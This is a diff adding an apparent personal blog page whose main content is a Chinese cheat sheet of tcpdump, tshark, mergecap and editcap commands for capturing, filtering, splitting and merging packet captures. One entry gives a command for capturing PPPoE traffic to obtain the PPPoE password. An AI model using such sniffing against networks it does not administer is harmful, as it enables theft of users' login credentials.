+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 host 192.168.1.123 and icmp -w /tmp/xxx.cap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>抓192.168.1.123的80端口和110和25以外的其他端口的包</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 host 192.168.1.123 and ! port 80 and ! port 25 and ! port 110 -w /tmp/xxx.cap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>抓vlan 1的包</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 port 80 and vlan 1 -w /tmp/xxx.cap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>抓pppoe的密码</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 pppoes -w /tmp/xxx.cap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>以100m大小分割保存文件， 超过100m另开一个文件</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 -w /tmp/xxx.cap  -C 100m</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>把后两个数据包并到一个数据包merge.pcap</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mergecap -w merge.pcap 1.pcap 2.pcap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>按照radius条件过滤数据包</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tshark -r 1.pcap radius -w radius.pcap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>按照数据包数分割一个大的数据</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>editcap -c 1000000 merge.pcap split01.pcap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>split pcap</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>editcap -c 100000 in.pcap out.pcap</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/page/5/">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/blog/page/3/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>最新发布</h1>
+  <ul id="最新文章">
+    
+      <li class="post">
+        <a href="/blog/2017/03/26/migarate-duoshuo-to-disqus/">Migarate Duoshuo to Disqus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/02/14/yong-pyinstallerda-bao-pythonjiao-ben-gua-pei-windows/">用Pyinstaller打包python脚本适配windows</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/02/14/pythonzai-windows-cmdzhong-shu-chu-zhong-wen/">Python在windows CMD中输出中文</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/12/25/jia-mi-ji-zhu-fa-zhan/">加密技术发展</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/12/18/gpuyun-suan-qia-bei-cun/">GPU运算卡备存</a>
+      </li>
+    
+  </ul>
+</section>
+<section>
+  <h1>最新发布</h1>
+  <ul id="最新文章">
+    
+      <li class="post">
+        <a href="/blog/2017/03/26/migarate-duoshuo-to-disqus/">Migarate Duoshuo to Disqus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/02/14/yong-pyinstallerda-bao-pythonjiao-ben-gua-pei-windows/">用Pyinstaller打包python脚本适配windows</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/02/14/pythonzai-windows-cmdzhong-shu-chu-zhong-wen/">Python在windows CMD中输出中文</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/12/25/jia-mi-ji-zhu-fa-zhan/">加密技术发展</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/12/18/gpuyun-suan-qia-bei-cun/">GPU运算卡备存</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating&#8230;</li>
+  </ul>
+  
+  <a href="https://github.com/memoryboxes">@memoryboxes</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'memoryboxes',
+            count: 10,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+<section> 
+  <h1>文章分类</h1> 
+  <ul id="categories"> 
+    <li class='category'><a href='/blog/categories/android/'>Android (1)</a></li>
+<li class='category'><a href='/blog/categories/array/'>Array (1)</a></li>
+<li class='category'><a href='/blog/categories/c/'>C (1)</a></li>
+<li class='category'><a href='/blog/categories/c2c/'>C2C (1)</a></li>
+<li class='category'><a href='/blog/categories/cdn/'>CDN (1)</a></li>
+<li class='category'><a href='/blog/categories/designpattern/'>DesignPattern (1)</a></li>
+<li class='category'><a href='/blog/categories/django/'>Django (3)</a></li>
+<li class='category'><a href='/blog/categories/docker/'>Docker (4)</a></li>
+<li class='category'><a href='/blog/categories/linux/'>Linux (4)</a></li>
+<li class='category'><a href='/blog/categories/macvtap/'>Macvtap (1)</a></li>
+<li class='category'><a href='/blog/categories/markdown/'>Markdown (1)</a></li>
+<li class='category'><a href='/blog/categories/mongodb/'>MongoDB (1)</a></li>
+<li class='category'><a href='/blog/categories/mongodb/'>Mongodb (1)</a></li>
+<li class='category'><a href='/blog/categories/packet-mmap/'>PACKET_MMAP (1)</a></li>
+<li class='category'><a href='/blog/categories/python/'>Python (4)</a></li>
+<li class='category'><a href='/blog/categories/sdn/'>SDN (1)</a></li>
+<li class='category'><a href='/blog/categories/svn/'>SVN (1)</a></li>
+<li class='category'><a href='/blog/categories/tcp-ip/'>TCP/IP (3)</a></li>
+<li class='category'><a href='/blog/categories/tokumx/'>TokuMx (1)</a></li>
+<li class='category'><a href='/blog/categories/unicode/'>Unicode (1)</a></li>
+<li class='category'><a href='/blog/categories/vim/'>Vim (2)</a></li>
+<li class='category'><a href='/blog/categories/zsh/'>Zsh (1)</a></li>
+<li class='category'><a href='/blog/categories/autotools/'>autotools (1)</a></li>
+<li class='category'><a href='/blog/categories/bitcoin/'>bitcoin (2)</a></li>
+<li class='category'><a href='/blog/categories/bootstrap/'>bootstrap (1)</a></li>
+<li class='category'><a href='/blog/categories/branch/'>branch (1)</a></li>
+<li class='category'><a href='/blog/categories/business/'>business (1)</a></li>
+<li class='category'><a href='/blog/categories/centos/'>centos (2)</a></li>
+<li class='category'><a href='/blog/categories/cisco/'>cisco (1)</a></li>
+<li class='category'><a href='/blog/categories/collections/'>collections (1)</a></li>
+<li class='category'><a href='/blog/categories/color/'>color (1)</a></li>
+<li class='category'><a href='/blog/categories/colorscheme/'>colorscheme (1)</a></li>
+<li class='category'><a href='/blog/categories/config/'>config (1)</a></li>
+<li class='category'><a href='/blog/categories/crontab/'>crontab (1)</a></li>
+<li class='category'><a href='/blog/categories/docker/'>docker (1)</a></li>
+<li class='category'><a href='/blog/categories/dpdk/'>dpdk (1)</a></li>
+<li class='category'><a href='/blog/categories/epel/'>epel (1)</a></li>
+<li class='category'><a href='/blog/categories/externals/'>externals (1)</a></li>
+<li class='category'><a href='/blog/categories/finance/'>finance (1)</a></li>
+<li class='category'><a href='/blog/categories/freeze/'>freeze (1)</a></li>
+<li class='category'><a href='/blog/categories/gcc/'>gcc (1)</a></li>
+<li class='category'><a href='/blog/categories/git/'>git (3)</a></li>
+<li class='category'><a href='/blog/categories/grunt/'>grunt (1)</a></li>
+<li class='category'><a href='/blog/categories/hardware/'>hardware (1)</a></li>
+<li class='category'><a href='/blog/categories/javascript-pattern/'>javascript_pattern (3)</a></li>
+<li class='category'><a href='/blog/categories/jenkins/'>jenkins (1)</a></li>
+<li class='category'><a href='/blog/categories/kernel/'>kernel (1)</a></li>
+<li class='category'><a href='/blog/categories/ldap/'>ldap (1)</a></li>
+<li class='category'><a href='/blog/categories/learn123/'>learn123 (1)</a></li>
+<li class='category'><a href='/blog/categories/libpcap/'>libpcap (1)</a></li>
+<li class='category'><a href='/blog/categories/life/'>life (1)</a></li>
+<li class='category'><a href='/blog/categories/linux/'>linux (7)</a></li>
+<li class='category'><a href='/blog/categories/lvm/'>lvm (1)</a></li>
+<li class='category'><a href='/blog/categories/mongodb/'>mongodb (1)</a></li>
+<li class='category'><a href='/blog/categories/mongoexport/'>mongoexport (1)</a></li>
+<li class='category'><a href='/blog/categories/mysql/'>mysql (1)</a></li>
+<li class='category'><a href='/blog/categories/netcat/'>netcat (1)</a></li>
+<li class='category'><a href='/blog/categories/network/'>network (6)</a></li>
+<li class='category'><a href='/blog/categories/octopress/'>octopress (1)</a></li>
+<li class='category'><a href='/blog/categories/openvswitch/'>openvswitch (1)</a></li>
+<li class='category'><a href='/blog/categories/panic/'>panic (1)</a></li>
+<li class='category'><a href='/blog/categories/product/'>product (1)</a></li>
+<li class='category'><a href='/blog/categories/repo/'>repo (1)</a></li>
+<li class='category'><a href='/blog/categories/satoshi/'>satoshi (1)</a></li>
+<li class='category'><a href='/blog/categories/server/'>server (1)</a></li>
+<li class='category'><a href='/blog/categories/shell/'>shell (1)</a></li>
+<li class='category'><a href='/blog/categories/svn/'>svn (1)</a></li>
+<li class='category'><a href='/blog/categories/tag/'>tag (1)</a></li>
+<li class='category'><a href='/blog/categories/tcpdump/'>tcpdump (1)</a></li>
+<li class='category'><a href='/blog/categories/tmux/'>tmux (1)</a></li>
+<li class='category'><a href='/blog/categories/torrent/'>torrent (1)</a></li>
+<li class='category'><a href='/blog/categories/uwsgi/'>uwsgi (1)</a></li>
+<li class='category'><a href='/blog/categories/vim/'>vim (1)</a></li>
+<li class='category'><a href='/blog/categories/vmware/'>vmware (1)</a></li>
+<li class='category'><a href='/blog/categories/windows/'>windows (1)</a></li>
+<li class='category'><a href='/blog/categories/yum/'>yum (1)</a></li>
+<li class='category'><a href='/blog/categories/云计算/'>云计算 (1)</a></li>
+<li class='category'><a href='/blog/categories/华容道/'>华容道 (1)</a></li>
+<li class='category'><a href='/blog/categories/批量删除/'>批量删除 (1)</a></li>
+<li class='category'><a href='/blog/categories/生活/'>生活 (1)</a></li>
+<li class='category'><a href='/blog/categories/表/'>表 (1)</a></li>
+<li class='category'><a href='/blog/categories/读书摘录/'>读书摘录 (2)</a></li>
+  
+    </ul> 
+</section>
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2017 - memoryboxes -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'memoryboxes';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
